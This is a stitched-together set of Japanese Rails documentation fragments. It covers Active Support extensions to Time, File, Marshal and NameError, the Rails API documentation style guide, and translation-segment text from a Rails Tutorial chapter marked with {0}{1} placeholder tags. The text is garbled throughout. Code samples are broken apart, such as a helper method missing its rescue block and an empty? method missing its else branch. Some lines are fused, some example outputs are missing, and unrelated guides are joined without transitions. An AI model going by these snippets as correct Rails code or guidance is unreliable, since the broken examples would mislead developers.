同様に、分がゼロの場合、秒も値を与えられない限りゼロになります。
now.change(min: 0)
# => Tue, 08 Jun 2010 01:00:00 +0000
DateTime.current.change(month: 2, day: 30)
日時に対して期間を加減算できます。
# => Mon, 09 Aug 2010 23:15:17 +0000
now + 1.year
# => Tue, 09 Aug 2011 23:15:17 +0000
now - 1.week
# => Mon, 02 Aug 2010 23:15:17 +0000
DateTime.new(1582, 10, 4, 23) + 1.hour
# => Fri, 15 Oct 1582 00:00:00 +0000
`Time`の拡張
NOTE: これらはすべて同じ定義ファイル`active_support/core_ext/time/calculations.rb`にあります。
Active Supportは、`DateTime`で使用できるメソッドの多くを`Time`に追加しています。
past?
today?
future?
seconds_since_midnight
advance
これらは同様に動作します。
関連するドキュメントを参照し、以下の相違点についても把握しておいてください。
* `change`メソッドは追加の`:usec`も受け付けます。
* `Time`は夏時間 (DST) を理解します。以下のように夏時間を正しく算出できます。
Time.zone_default
# => #<ActiveSupport::TimeZone:0x7f73654d4f38 @utc_offset=nil, @name="Madrid", ...
# バルセロナでは夏時間により2010/03/28 02:00 +0100が2010/03/28 03:00 +0200になる
t = Time.local(2010, 3, 28, 1, 59, 59)
# => Sun Mar 28 01:59:59 +0100 2010
t.advance(seconds: 1)
# => Sun Mar 28 03:00:00 +0200 2010
* `since`や`ago`の移動先の時間が`Time`で表現できない場合、`DateTime`オブジェクトが代わりに返されます。
#### `Time.current`
Active Supportでは、`Time.current`を定義して現在のタイムゾーンにおける「今日」を定めています。
このメソッドは`Time.now`と似ていますが、ユーザー定義のタイムゾーンがある場合にそれを考慮する点が異なります。
Active Supportでは`past?`、`today?`、`future?`を示すインスタンス述語も定義されており、これらはすべてこの`Time.current`を起点にしています。
ユーザー定義のタイムゾーンを考慮するメソッドを使用して日付を比較したい場合、`Time.now`ではなく必ず`Time.current`を使用してください。
将来、ユーザー定義のタイムゾーンがシステムのタイムゾーンと比較されることがありえます。システムのタイムゾーンではデフォルトで`Time#now`が使用されます。
つまり、`Time.now`が`Time.currentyesterday`と等しくなることがありえるということです。
#### `all_day`、`all_week`、`all_month`、`all_quarter`、`all_year`
`all_day`メソッドは、現在時刻を含むその日一日を表す範囲を返します。
now = Time.current
# => Mon, 09 Aug 2010 23:20:05 UTC +00:00
now.all_day
# => Mon, 09 Aug 2010 00:00:00 UTC +00:00..
Mon, 09 Aug 2010 23:59:59 UTC +00:00
同様に、`all_week`、`all_month`、`all_quarter`、`all_year`も時間の範囲を生成できます。
now.all_week
Sun, 15 Aug 2010 23:59:59 UTC +00:00
now.all_week(:sunday)
# => Sun, 16 Sep 2012 00:00:00 UTC +00:00..
Sat, 22 Sep 2012 23:59:59 UTC +00:00
now.all_month
# => Sat, 01 Aug 2010 00:00:00 UTC +00:00..
Tue, 31 Aug 2010 23:59:59 UTC +00:00
now.all_quarter
# => Thu, 01 Jul 2010 00:00:00 UTC +00:00..
Thu, 30 Sep 2010 23:59:59 UTC +00:00
now.all_year
# => Fri, 01 Jan 2010 00:00:00 UTC +00:00..
Fri, 31 Dec 2010 23:59:59 UTC +00:00
### 時間コンストラクタ
Time.current
# => Fri, 06 Aug 2010 17:11:58 CEST +02:00
`DateTime`と同様、述語`past?`と`future?`は`Time.current`を起点とします。
構成される時間が、実行プラットフォームの`Time`でサポートされる範囲を超えている場合は、usecは破棄され、`DateTime`オブジェクトが代りに返されます。
Timeオブジェクトに対して期間を加減算できます。
#  => Tue, 09 Aug 2011 23:21:11 UTC +00:00
# => Mon, 02 Aug 2010 23:21:11 UTC +00:00
Time.utc(1582, 10, 3) + 5.days
# => Mon Oct 18 00:00:00 UTC 1582
`File`の拡張
### `atomic_write`
`File.atomic_write`クラスメソッドを使用すると、書きかけの文章を誰にも読まれないようにファイルを保存することができます。
このメソッドにファイル名を引数として渡すと、書き込み用にオープンされたファイルハンドルを生成します。
ブロックが完了すると、`atomic_write`はファイルハンドルをクローズして処理を完了します。
Action Packは、このメソッドを利用して`all.css`などのキャッシュファイルへの書き込みを行ったりしています。
File.atomic_write(joined_asset_path) do |cache|
  cache.write(join_asset_file_contents(asset_paths))
`atomic_write`は、処理を完了するために一時的なファイルを作成します。
ブロック内のコードが実際に書き込むのはこのファイルです。
完了時にはこの一時ファイルはリネームされます。リネームは、POSIXシステムのアトミック操作に基いて行われます。
書き込み対象ファイル既にが存在する場合、`atomic_write`はそれを上書きしてオーナーとパーミッションを保持します。
ただし、`atomic_write`メソッドがファイルのオーナーシップとパーミッションを変更できないケースがまれにあります。このエラーはキャッチされ、そのファイルがそれを必要とするプロセスからアクセスできるようにするために、ユーザーのファイルシステムへの信頼をスキップします。
NOTE: `atomic_write`が行なうchmod操作が原因で、書き込み対象ファイルがACLセットを持っているときにそのACLが再計算/変更されます。
WARNING: `atomic_write`で追記を行なうことはできません。
この補助ファイルは標準の一時ファイル用ディレクトリに書き込まれますが、2番目の引数でディレクトリを直接指定することもできます。
NOTE: 定義ファイルの場所は`active_support/core_ext/file/atomic.rb`です。
`Marshal`の拡張
### `load`
Active Supportは、`load`に一定の自動読み込みサポートを追加します。
たとえば、ファイルキャッシュストアでは以下のように非直列化 (deserialize) します。
File.open(file_name) { |f| Marshal.load(f) }
キャッシュデータが不明な定数を参照している場合、自動読み込みがトリガされます。読み込みに成功した場合は非直列化を透過的に再試行します。
WARNING: 引数が`IO`の場合、再試行を可能にするために`rewind`に応答する必要があります。
通常のファイルは`rewind`に応答します。
NOTE: 定義ファイルの場所は`active_support/core_ext/marshal.rb`です。
`NameError`の拡張
Active Supportは`NameError`に`missing_name?`メソッドを追加します。このメソッドは、引数として渡された名前が原因で例外が発生するかどうかをテストします。
渡される名前はシンボルまたは文字列です。
シンボルを渡した場合は単なる定数名をテストし、文字列を渡した場合はフルパス (fully-qualified) の定数名をテストします。
TIP: シンボルは`:"ActiveRecord::Base"`で行なっているのと同じようにフルパスの定数として表すことができます。シンボルがそのように動作するのはそれが便利だからであり、技術的にそうしなければならないというものではありません。
たとえば、`ArticlesController`のアクションが呼び出されると、Railsはその名前からすぐに推測できる`ArticleHelper`を使用しようとします。
ここではこのヘルパーモジュールが存在していなくても問題はないので、この定数名で例外が発生しても例外として扱わずに黙殺する必要があります。
しかし、実際に不明な定数が原因で`articles_helper.rb`が`NameError`エラーを発生するという場合が考えられます。
そのような場合は、改めて例外を発生させなくてはなりません。
`missing_name?`メソッドは、この2つの場合を区別するために使用されます。
def default_helper_module!
  module_name = name.sub(/Controller$/, '')
  module_path = module_name.underscore
  helper module_path
  raise e unless e.is_missing? 
"helpers/#{module_path}_helper"
  raise e unless e.missing_name? 
"#{module_name}Helper"
NOTE: 定義ファイルの場所は`active_support/core_ext/name_error.rb`です。
`LoadError`の拡張
`is_missing?`は、パス名を引数に取り、特定のファイルが原因で例外が発生するかどうかをテストします (".rb"拡張子が原因と思われる場合を除きます)。
たとえば、`ArticlesController`のアクションが呼び出されると、Railsは`articles_helper.rb`を読み込もうとしますが、このファイルは存在しないことがあります。
ヘルパーモジュールは必須ではないので、Railsは読み込みエラーを例外扱いせずに黙殺します。
しかし、ヘルパーモジュールが存在しないために別のライブラリが必要になり、それがさらに見つからないという場合が考えられます。
Railsはそのような場合には例外を再発生させなければなりません。
`is_missing?`メソッドは、この2つの場合を区別するために使用されます。
NOTE: 定義ファイルの場所は`active_support/core_ext/load_error.rb`です。
他の環境で実行したい場合は
[Spring README](https://github.com/rails/spring#rake)を参照してください。
使用するプラグインはすべてgemに展開してGemfileに追加しなければなりません。 
#   self.include_root_in_json = false 
  get 'clashing/:id' => 'test#example', as: :example 
API ドキュメント作成ガイドライン
本ガイドでは、Rails APIドキュメント作成のガイドラインについて解説します(訳注: APIドキュメントが英語で書かれることを前提とします。また、サンプルのコメントは基本的に英語のままにしています)。
* APIドキュメントを効果的に書く方法
* ドキュメント作成用のスタイルガイド (Rubyコード開発用のスタイルガイドとは別)
[Rails API ドキュメント](http://api.rubyonrails.org)は[RDoc](http://docs.seattlerb.org/rdoc/)を使用して生成されます。
  bundle exec rake rdoc
生成されたHTMLファイルは./doc/rdocディレクトリに置かれます。
RDocの記法に関しては、[markup](http://docs.seattlerb.org/rdoc/RDoc/Markup.html)を参照してください(訳注: 別ページですが[日本語のRDocライブラリ解説](http://docs.ruby-lang.org/ja/2.1.0/library/rdoc.html)があります)。[追加のディレクティブ](http://docs.seattlerb.org/rdoc/RDoc/Parser/Ruby.html)にも目を通しておいてください。
語調
簡潔かつ宣言的に書くこと。
簡潔さはそれだけで長所になります。
現在形で書くこと。"Returned a hash that..." や "Will return a hash that..." ではなく"Returns a hash that..."のように書く。
コメントの英語は大文字で始めること。
句読点や記号の用法は常識に従うこと。
# Declares an attribute reader backed by an internally-named
# instance variable.
def attr_internal_reader(*attrs)
読者に現時点の最新の方法が伝わるように書くこと、それも明示的かつ暗黙に。
先進的な分野で推奨されている慣用表現を使用すること。
推奨される方法が強調されるようセクションの順序に注意し、必要であれば順序を入れ替えること。
作成するドキュメント自身がRailsのベストプラクティスのよいモデルとなるように、そしてRailsの最新かつ模範的な使用法になるように書くこと。
ドキュメントは簡潔であり、かつ全体を理解できるものであること。
例外的なケースについても調査し、ドキュメントに盛り込むこと。
あるモジュールが無名であったらどうなるか。
あるコレクションの内容が空であったらどうなるか。
引数がnilであったらどうなるか。
Railsのコンポーネント名は語の間にスペースを1つ置く表記を正式なものとする (例: "Active Support")
なお、`ActiveRecord`はRubyモジュール名だが、Active RecordはORMを指す。
Railsドキュメント内でコンポーネントを指す場合には常に正式名称を使用すること。ブログ投稿やプレゼンテーションなどでもこの点に留意し、異なる名称で読者などを驚かせないようにすること。
正しいスペルを使用すること (Arel、Test::Unit、RSpec、HTML、 MySQL、JavaScript、ERBなど)。大文字小文字にも注意すること。
疑わしい場合には公式ドキュメントなど、信頼できる情報源を参照すること。
"SQL" という語の前には冠詞 "an" を付けること (例: "an SQL statement")。
同様に、"an SQLite database"のようにすること。
"you"や"your"を使用する表現を避けること。
以下の例文ではyouが3度も使用されている。
```markdown
If you need to use `return` statements in your callbacks, it is recommended that you explicitly define them as methods.
以下のスタイルで書くこと。
If `return` is needed it is recommended to explicitly define a method.
同様に、説明上何らかの人物を仮定して、その人物を代名詞で呼ぶ場合 ("a user with a session cookie" など)、heやsheのような性別のある代名詞を避け、they/their/themのような性別に影響されない代名詞を使用すること。
以下のように言い換える。
* heまたはshe -> theyに置き換える
* himまたはher -> themに置き換える
* hisまたはher -> theirに置き換える
* hisまたはhers -> theirsに置き換える
* himselfまたはherself -> themselvesに置き換える
英語
アメリカ英語を使用すること ( *color* 、 *center* 、 *modularize* など)。
詳細は[アメリカ英語とイギリス英語のスペルの違い](http://en.wikipedia.org/wiki/American_and_British_English_spelling_differences) (英語) を参照してください。
サンプルコード
意味のあるサンプルコードを選ぶこと。概要と基本を端的に示し、かつ興味深い点や落とし穴も示されているのが理想です。
サンプルコードのインデントにはスペース2文字を使用すること。マークアップ用には左マージンに合わせてスペース2文字を使用します。
サンプルコードの例は[Railsコーディングルールに従う](contributing_to_ruby_on_rails.html#rails%E3%82%B3%E3%83%BC%E3%83%87%E3%82%A3%E3%83%B3%E3%82%B0%E3%83%AB%E3%83%BC%E3%83%AB%E3%81%AB%E5%BE%93%E3%81%86)を参照してください。
短いドキュメントでは、スニペットを紹介する際に"Examples"と明示的にラベルを付ける必要はない。単にパラグラフに従うようにします。
# Converts a collection of elements into a formatted string by
# calling +to_s+ on all elements and joining them.
#   Blog.all.to_formatted_s # => "First PostSecond PostThird Post"
逆に大きな章で構成されているドキュメントであれば、"Examples"セクションを設けてもよい。
# ==== Examples
#   Person.exists?(
#   Person.exists?('
name: "David")
#   Person.exists?(['
name LIKE ?', "%#{query}%"])
式の実行結果は式に続けて書き、冒頭に "# => " を追加して縦を揃えること。
#   1.even? 
#   1.odd?  
#   2.even? 
#   2.odd?  
1つの行が長くなりすぎる場合はコメントを次の行に置いてもよい
#   label(:article, :title)
#   # => <label for="article_title">Title</label>
#   label(:article, :title, "A short title")
#   # => <label for="article_title">A short title</label>
#   label(:article, :title, "A short title", class: "title_label")
#   # => <label for="article_title" class="title_label">A short title</label>
実行結果を示すために`puts`や`p`などの印字用メソッドを使用することはなるべく避ける。
逆に、(実行結果を示さない) 通常のコメントでは矢印を使用しないこと。
#   polymorphic_url(record)  # same as comment_url(record)
論理値
述語やフラグでの論理値の表記は、正確な値表現よりも、論理値の意味を優先すること。
"true"および"false"をRubyの定義どおりに使用する場合は、通常のフォントで表記すること。
シングルトンの`true`および`false`は等幅フォントで表記すること(訳注: シングルトンの`true`および`false`とは、`TrueClass`および`FalseClass`の唯一のインスタンスのことです)。
"truthy"のような用語は避けてください。Rubyでは言語レベルでtrueとfalseが定義されているので、これらの用語は技術的に厳密な意味が与えられており、言い方を変える必要はありません。
経験から申し上げると、どうしても必要な場合を除いて、ドキュメントでシングルトンを使用すべきではありません。
シングルトンを避けることで、`!!`や三項演算子のような人工的な表現を避けることができ、リファクタリングもしやすくなります。さらに、実装で呼び出されるメソッドが返す値の表現が少しでも違うとコードが正常に動作しないという事態も避けられます。
`config.action_mailer.perform_deliveries` specifies whether mail will actually be delivered and is true by default (訳: `config.action_mailer.perform_deliveries`は、メールを実際に配信するかどうかを指定します。デフォルト値はtrueです。)
上の例では、フラグのデフォルト値の実際の表現がどれであるか (訳注: シングルトンのtrueなのか、trueと評価されるオブジェクトなのか) を知る必要はありません。従って、論理値の意味だけをドキュメントに書くべきです。
以下は述語の例です。
# Returns true if the collection is empty. (訳:コレクションが空ならtrueを返す)
# If the collection has been loaded (コレクションが読み込まれると)
# it is equivalent to <tt>collection.size.zero?</tt>. if the (<tt>collection.size.zero?</tt>と同値)
# collection has not been loaded, it is equivalent to (コレクションが読み込まれなかった場合は)
# <tt>collection.exists?</tt>. If the collection has not already been (<tt>collection.exists?</tt>と同値。コレクションが読み込まれておらず、)
# loaded and you are going to fetch the records anyway it is better to (どうしてもレコードを取り出したい場合は)
# check <tt>collection.length.zero?</tt>. (<tt>collection.length.zero?</tt>をチェックすること)
def empty?
  if loaded?
    size.zero?
    @target.blank? 
このAPIは特定の値にコミットしないように注意が払われており、メソッドには述語と意味が示されています。これで十分です。
ファイル名
経験則からも、ファイル名はRailsアプリケーションのルート・ディレクトリからの相対パスで記述すること。
config/routes.rb            # YES
routes.rb                   # NO
RAILS_ROOT/config/routes.rb # NO
フォント
### 等幅フォント
以下の場合は等幅フォントを使用すること。
* 定数、特にクラス名およびモジュール名
* メソッド名
* 次のようなリテラル: `nil`、`false`、`true`、`self`
* シンボル
* メソッドのパラメータ
* ファイル名
class Array
  # Calls +to_param+ on all its elements and joins the result with
  # slashes. 
This is used by +url_for+ in Action Pack.
    collect { |e| e.to_param }.join '/'
WARNING: 等幅フォントを`+...+`というマークアップで表記できるのは、通常のメソッド名、シンボル、パス (通常のスラッシュを使用しているもの) のようなシンプルなものに限られます。
これらよりも複雑なものを表記するときには必ず`<tt>...</tt>`でマークアップしてください。特に名前空間を使用しているクラス名やモジュール名では必須です (`<tt>ActiveRecord::Base</tt>`など)。
以下のコマンドで、RDocの出力を手軽に確認できます。
$ echo "+:to_param+" | rdoc --pipe
#=> <p><code>:to_param</code></p>
### Regularフォント
Rubyのキーワードでない、英語としての"true"と"false"にはregularフォント (ItalicやBoldでないフォント) を使用すること。
# Runs all the validations within the specified context.
# Returns true if no errors are found, false otherwise.
# If the argument is false (default is +nil+), the context is
# set to <tt>:create</tt> if <tt>new_record?
</tt> is true,
# and to <tt>:update</tt> if it is not.
# Validations with no <tt>:on</tt> option will run no
# matter the context. 
Validations with # some <tt>:on</tt>
# option will only run in the specified context.
def valid?(
説明のリスト
項目 (オプションやパラメータのリストなど) とその説明はハイフンでつなぐこと。コロンはシンボルで使用されるので、ハイフンの方が読みやすくなります。
# * <tt>:allow_nil</tt> - Skip validation if attribute is +nil+.
説明文は通常の英語として大文字で始め、ピリオドで終わること。
動的に生成されるメソッド
`(module|class)_eval(文字列)`メソッドで作成されるメソッドには、生成されたコードのインスタンスのそばにコメントが置かれます。
このように作成されたコメントには、スペース2文字分のインデントが与えられます。
for severity in Severity.constants
  class_eval <<-EOT, __FILE__, __LINE__
    def #{severity.downcase}(message = nil, progname = nil, &block)  # def debug(message = nil, progname = nil, &block)
      add(#{severity}, message, progname, &block)                    #   add(DEBUG, message, progname, &block)
    end                                                              # end
                                                                     #
    def #{severity.downcase}?                                        
# def debug?
      #{severity} >= @level                                          #   DEBUG >= @level
  EOT
生成された行が多過ぎる (200行を超える) 場合、コメントを呼び出しの上に置いてください。
# def self.find_by_login_and_activated(*args)
#   options = args.extract_options!
#   ...
self.class_eval %{
  def self.#{method_id}(*args)
    options = args.extract_options!
メソッドの可視性
Railsのドキュメントを作成するにあたり、ユーザー向けのパブリックなAPIと内部APIの違いを理解しておくことが重要です。
多くのライブラリと同様、Railsでも内部APIの定義にprivateキーワードが使用されます。
しかし、パブリックなAPIのルールは若干異なります。
Railsでは、すべてのpublicなメソッドがユーザーに公開されて使用されるということを前提にしていません。代りに、そのメソッドが内部APIであることを示すために`:nodoc:`ディレクティブを使用します。
つまり、Railsでは可視性が`public`のメソッドであっても、ユーザーに公開されているとは限らないのです。
`ActiveRecord::Core::ClassMethods#arel_table`を例に説明します。
module ActiveRecord::Core::ClassMethods
  def arel_table #:nodoc:
    # 何か書く
このメソッドは一見して`ActiveRecord::Core`のパブリックなクラスメソッドであり、実際それ自体は間違いではありません。
しかしRailsチームはこの種のメソッドに依存して欲しくないと考えています。
そのために`:nodoc:`を指定して、ドキュメントに含まれないようにしています。
実際の理由は、Railsチームはこの種の内部メソッドの動作を必要に応じてリリースごとに変更できるようにしたいからです。
これらのメソッドは名前や戻り値が変更されたり、クラス自体が消滅したりすることもありえます。従ってこれらは外部に対して何も保証されておらず、Railsアプリケーションやプラグインがこの種のAPIに依存すべきではありません。
これらのAPIに依存してしまうと、Railsを次のリリースにアップグレードしたときにアプリケーションやGemが壊れる危険性があります。
Rails貢献者がドキュメントを作成する場合、そのAPIを外部開発者に公開してよいかどうかに常に注意を払う必要があります。
Railsチームは、パブリックなAPIに対して重大な変更を行なう際は、必ず非推奨サイクルを経てから行なうことにしています。
内部メソッドや内部クラスの可視性がprivateになっていない場合は、`:nodoc:`オプションを指定することを推奨します (なお可視性がprivateの場合はデフォルトで内部扱いになります)。
APIが安定したら可視性を変更できますが、後方互換性を保ちながらパブリックなAPIを変更することは簡単ではありません。
クラスやモジュールに対して`:nodoc:`を指定した場合、その中のすべてのメソッドは内部APIであり、直接アクセスすることは許されないことが示されます。
既存の`:nodoc:`指定はむやみに変更しないでください。
この指定を外す際は、必ずコアチームの誰かかコードの著者に相談してからにしてください。
`:nodoc:`の追加は、絶対に無断で行わないでください。ドキュメントからそのメソッドやクラスの記述が失われてしまいます。
たとえば、あるメソッドの可視性をprivateからpublicに切り替えた際に、内部のパブリックメソッドに`:nodoc:`が指定されていなかったという事例がありえます。
そのようなケースを見つけたら、必要に応じてpull requestで議論してください。直接docrailsを変更することはくれぐれも行わないでください。
まとめ: Railsチームは可視性がpublicで内部でのみ使用するメソッドやクラスには`:nodoc:`を指定します。APIの可視性の変更は慎重に行なわれるべきであり、pull requestでの議論を経てから行なうこと。
Railsスタック
Rails APIの一部をドキュメント化する際には、それがRailsスタックのひとつとなることを意識しておくことが重要です。
つまり、ドキュメント化しようとしているメソッドやクラスのスコープやコンテキストに応じて振る舞いが変化することがあるということです。
スタック全体を考慮に入れれば、振る舞いの変化するはあちこちに見つかります。`ActionView::Helpers::AssetTagHelper#image_tag`などが典型です。
# image_tag("icon.png")
#   # => <img alt="Icon" src="/assets/icon.png" />
`#image_tag`はデフォルトでは常に`/images/icon.png`を返しますが、アセットパイプラインなどを含むRailsのフルスタックで見ると、上のような結果が返されるところもあります。
デフォルトのRailsフルスタックを使用している場合、実際に経験する振る舞いに対してしか関心が持てないものです。
このような場合、特定のメソッドの振る舞いだけではなく、 _フレームワーク_ の振る舞いもドキュメント化するようにしたいと思います。
Railsチームが特定のAPIをどのように扱っているかを知りたい場合は、お気軽にチケットを発行して[issue tracker](https://github.com/rails/rails/issues)にパッチを送ってください。
このToyアプリケーションはもちろん動きますが完成品ではなく、しかも多くの手順が「魔法」のように思えるかもしれません。{0}{1}第3章{/1}{/0}以降で作成するサンプルアプリケーションでは同等の機能を1つ1つ手動で作成しますので、ご安心ください。
{0}リスト2.1{/0} <n><n>{1}Toyアプリケーション用の\kode{Gemfile}{/1}
{0}{1}リスト2.1{/1}{/0}の内容は{2}{1}リスト1.14{/1}{/2}と同じです。
{0}図 2.1 {/0}{1}Bitbucketにtoyアプリのリポジトリを作成する{/1}
{0}図 2.2 {/0}{1}ユーザーのデータモデル{/1}
詳しくは\ref{sec:database_migrations}から解説しますが、\kode{{1}図2.2{/1}}のユーザー ({3}users{/3}) はデータベースのテーブル (\emph{table}) に相当します。また、{3}id{/3}、{3}name{/3}、{3}email{/3}の属性はそれぞれテーブルのカラム (\emph{column}: 列) に相当します。
しかし実際には、マイクロポストをユーザーと\emph{関連付ける (associate)} 必要があります。そのため、マイクロポストの投稿者を記録するための\kode{user_id}も追加します。
{0}図 2.3 {/0}{1}マイクロポストのデータモデル{/1}
\ref{sec:demo_user_has_many_microposts}では、{2}user_id{/2}という属性を使用して、1人のユーザーに複数のマイクロポストが関連付けられるという構造を簡潔に説明します。詳細は\kode{{1}第11章{/1}}で完全に説明します。
\kode{name:string}と\kode{email:string}オプションを追加することで、Userモデルの内容が{1}{2}図2.2{/2}{/1}の表のとおりになるようにします
その際、{0}{1}表2.1{/1}{/0}に記載されている、ページとURLの関係を参照するとわかりやすいと思います。
{0}表2.1: {/0}{1}Usersリソースにおける、ページとURLの関係{/1}。
まずはユーザーの一覧を表示する\href{http://localhost:3000/users}{\texttt{index}}ページを見てみましょう。もちろん、この時点ではまだユーザーは登録されていません ({2}{3}図2.4{/3}{/2})。
{0}図2.4 {/0}{1}Usersリソース (\href{http://localhost:3000/users}{/users}) ページの最初の状態{/1}
ユーザーを新規作成するには、\href{http://localhost:3000/users/new}{\texttt{図2.5}}の{2}{3}new{/3}{/2}ページを表示します
{0}図2.5 {/0}{1}新規ユーザー作成ページ (\href{http://localhost:3000/users/new}{/users/new}){/1}
ユーザーが作成され、\href{http://localhost:3000/users/1}{\texttt{図2.6}}のように{2}{3}show{/3}{/2}ページが表示されます
(緑色のウェルカムメッセージは、{p0}で解説する{2}flash{/2}という機能を使用して表示しています)。
ここで、URLが\href{http://localhost:3000/users/1}{/users/1}と表示されていることに注目してください。ご想像のとおり、この数字\kode{1}は{2}{3}図2.2{/3}{/2}の\kode{id}属性そのものです。
{0}図2.6 {/0}{1}ユーザー表示用のページ (\href{http://localhost:3000/users/1}{/users/1}){/1}
今度は、ユーザー情報を変更するために\href{http://localhost:3000/users/1/edit}{\texttt{edit}}ページを表示してみましょう ({2}{3}図2.7{/3}{/2})。
この編集ページ上でユーザーに関する情報を変更し、[Update User] ボタンを押せば、Toyアプリケーション内のユーザー情報が変更されます ({0}{1}図2.8{/1}{/0})。
(詳細は{0}{1}第6章{/1}{/0}で説明しますが、このユーザー情報は、Webアプリケーションの背後にあるデータベースに保存されています。)
{0}図2.7{/0} {1}ユーザー編集用のページ (\href{http://localhost:3000/users/1/edit}{/users/1/edit}){/1}
{0}図2.8{/0} {1}情報が更新されたユーザー{/1}
{0}図2.9{/0} {1}2人目のユーザーが追加された一覧ページ (\href{http://localhost:3000/users}{/users}){/1}
ユーザーの作成、表示、編集方法について説明しましたので、今度はユーザーを削除してみましょう ({0}{1}図2.10{/1}{/0})。
{0}{1}図2.10{/1}{/0}の [Destroy] リンクをクリックするとユーザーが削除され、indexページのユーザーは1人だけになります
{0}図2.10{/0} {1}ユーザーを削除する{/1}
具体的には、\href{http://localhost:3000/users}{/users}のindexページをブラウザで開くという典型的な操作を行うときに何が起こっているかをMVC ({1}{2}図2.11{/2}{/1}) で説明します。
{0}図2.11{/0} {1}RailsにおけるMVC{/1}
最初にブラウザからのリクエストを見てみましょう。このリクエストは、アドレスバーにURLを入力したりリンクをクリックした時に発生します ({0}{1}図2.11{/1}{/0}の①)。
ユーザーからリクエストされたURLをUsersリソースで使用するコントローラのアクションに割り当てる (マッピングする) コードは、{0}{1}リスト2.2{/1}{/0}のような感じになります。このコードはRailsのルーター設定ファイル (config/routes.rb) の中で使用され、URLとアクションの組み合わせ ({2}{1}表2.1{/1}{/2}) を効率よく設定することができます
{0}リスト2.2{/0} <n><n>{1}Railsルートで使用するUsersリソース用のルール{2}{/2} {3}config/routes.rb{/3}{/1}
{0}リスト2.3{/0} <n><n>{1}ルートからusersへのルーティングを追加する{2}{/2} {3}config/routes.rb{/3}{/1}
{0}リスト2.4{/0} <n><n>{1}Usersコントローラの骨格 {2}{/2} {3}app/controllers/users_controller.rb{/3}{/1}
  end
{0}{1}表2.2{/1}{/0}のURLには重複しているものがあることにご注目ください。たとえば、\kode{show}アクションと \kode{update}アクションは、どちらも/users/1というURLに対応しています。
{0}表7.1{/0} {1}リスト\ref{code:rails_routes}のUsersリソースが提供するRESTfulなルート{/1}
UsersコントローラとUserモデルの関係をさらに考察するために、\kode{{1}リスト2.5{/1}}で{2}index{/2}アクションを整理してみました
{0}リスト2.5{/0} <n><n>{1}Toyアプリケーションの簡潔なユーザー\kode{index}アクション{3}{/3} {4}app/controllers/users_controller.rb{/4}{/1}
\kode{index}アクションに\kode{@users = User.all}という行があります ({1}{2}図2.11{/2}{/1}の③に相当)。これによって、Userモデルからすべてのユーザーの一覧を取り出し (④)、\kode{@users}という変数に保存します (⑤)。なお、@usersは「あっと ゆーざーず」と発音します。
Userモデルの内容は{0}{1}リスト2.6{/1}{/0}にあります。驚くほどシンプルな内容ですが、継承 (\ref{sec:inheritance_hierarchies}および\ref{sec:ruby_classes}) によって多くの機能が備わっています。
特に、\emph{Active Record}というRubyライブラリのおかげで、{1}{2}リスト2.6{/2}{/1}のUserモデルは\kode{User.all}というリクエストに対して、DB上のすべてのユーザーを返すことができます。
{0}リスト2.6{/0} <n><n>{1}ToyアプリケーションのUserモデル{2}{/2} {3}app/models/user.rb{/3}{/1}
\kode{@users}変数にユーザー一覧が保存されると、コントローラは\emph{{2}リスト2.7{/2}}の{3}ビュー{/3}を呼び出します (⑥)。
{0}リスト2.7{/0} <n><n>{1}indexアクションに対応しているビュー{2}{/2} {3}app/views/users/index.html.erb{/3}{/1}
Usersリソースの場合と同様に、Micropostsリソースもscaffoldでコードを生成してみましょう。\kode{rails generate scaffold}コマンドを使用して、{1}{2}図2.3{/2}{/1}のデータモデルを実装してみます
置き換えた結果を{0}{1}リスト4.3{/1}{/0}に示します。
scaffoldで生成した実際のコードには{0}{1}リスト2.8{/1}{/0}よりも多くの改行が追加されていることがあります。
{0}リスト2.8{/0} <n><n>{1}Railsルートで使用するMicropostsリソース用のルール{2}{/2} {3}config/routes.rb{/3}{/1}
{0}表11.2{/0} {1}Micropostsリソースが提供するリスト\ref{code:demo_microposts_resource}のRESTfulルート{/1}
Micropostsコントローラ自体の構造を{0}{1}リスト2.9{/1}{/0}に示します。
{0}リスト2.9{/0} <n><n>{1}Micropostsコントローラの骨格 {2}{/2} {3}app/controllers/microposts_controller.rb{/3}{/1}
\href{http://localhost:3000/microposts/new}{/microposts/new}ページをブラウザで開き、新しいマイクロポストの情報を入力してマイクロポストをいくつか作成してみましょう ({1}{2}図2.12{/2}{/1})。
{0}図2.12{/0} {1}新しいマイクロポストの作成ページ (\href{http://localhost:3000/microposts/new}{/microposts/new}){/1}
ここではひとまずマイクロポストを1つか2つ作成し、少なくとも片方の\kode{user_id}が\kode{1}になるようにして、\ref{sec:a_user_tour}で作成した最初のユーザーのidと同じにします。
結果は{0}{1}図2.13{/1}{/0}のようになるはずです。
{0}図2.13{/0} {1}マイクロポストのindexページ (\href{http://localhost:3000/microposts}{/microposts}){/1}
{0}リスト2.10{/0} <n><n>{1}マイクロポストの最大文字数を140文字に制限する。{2}{/2} {3}app/models/micropost.rb{/3}{/1}
{0}{1}リスト2.10{/1}{/0}のコードは、これで本当に動作するのかと思えるかもしれませんが、ちゃんと動作します (検証機能については\ref{sec:user_validations}でさらに詳しく説明します)。141文字以上の新規マイクロポストを投稿してみればわかります。
{0}{1}図2.14{/1}{/0}に示したとおり、マイクロポストの内容が長すぎるという\emph{エラーメッセージ}がRailsによって表示されます
{0}図2.14{/0} {1}マイクロポストの作成に失敗した場合のエラーメッセージ{/1}
UserモデルとMicropostモデルをそれぞれ{0}{1}リスト2.10{/1}{/0}と{2}{1}リスト2.11{/1}{/2}のように更新することでこの関連付けを表現できます。
{0}リスト2.11{/0} <n><n>{1}1人のユーザーに複数のマイクロポストがある。{2}{/2} {3}app/models/user.rb{/3}{/1}
{0}リスト2.12{/0} <n><n>{1}1つのマイクロポストは1人のユーザーにのみ属する。{2}{/2} {3}app/models/micropost.rb{/3}{/1}
この関連付けを図で表したものが{0}{1}図2.15{/1}{/0}です。
\kode{microposts}テーブルには\kode{user_id}カラムを作成してあったので、それによってRailsとActive Recordがマイクロポストとユーザーを関連付けることができるようになっています。
{0}Figure 2.15: {/0}{1}The association between microposts and users.{/1}
{0}{1}第11章{/1}{/0}と{2}{1}第12章{/1}{/2}では、関連付けられたユーザーとマイクロポストを同時に表示し、Twitterのようなマイクロポストのフィードを作成する予定です。
We first invoke the console with \kode{rails console} at the command line, and then retrieve the first user from the database using \kode{User.first} (putting the results in the variable \kode{first_user})
このときActive Recordは、\kode{user_id}が\kode{first_user}のid (ここでは\kode{1}) と等しいマイクロポストを自動的に返します。
